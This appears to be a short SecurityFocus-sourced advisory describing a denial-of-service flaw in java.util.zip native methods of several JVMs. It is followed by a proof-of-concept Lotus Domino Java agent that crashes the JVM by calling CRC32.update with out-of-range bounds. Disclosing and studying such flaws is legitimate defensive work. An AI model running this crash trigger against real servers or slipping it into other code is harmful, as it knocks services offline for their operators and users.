source: http://www.securityfocus.com/bid/7109/info
  
Several implementations of the Java Virtual Machine have been reported to be prone to a denial of service condition. This vulnerability occurs in several methods in the java.util.zip class.
  
The methods can be called with certain types of parameters however, there does not appear to be proper checks to see whether the parameters are NULL values. When these native methods are called with NULL values, this will cause the JVM to reach an undefined state which will cause it to behave in an unpredictable manner and possibly crash.

import lotus.domino.*;
import java.util.zip.*;

public class JavaAgent extends AgentBase {

        public void NotesMain() {

                try {
                        Session session = getSession();
                        AgentContext agentContext =
session.getAgentContext();
                         CRC32 crc32 = new CRC32();
        crc32.update(new byte[0], 4, 0x7ffffffc);

                        // (Your code goes here)

                } catch(Exception e) {
                        e.printStackTrace();
                }
        }
}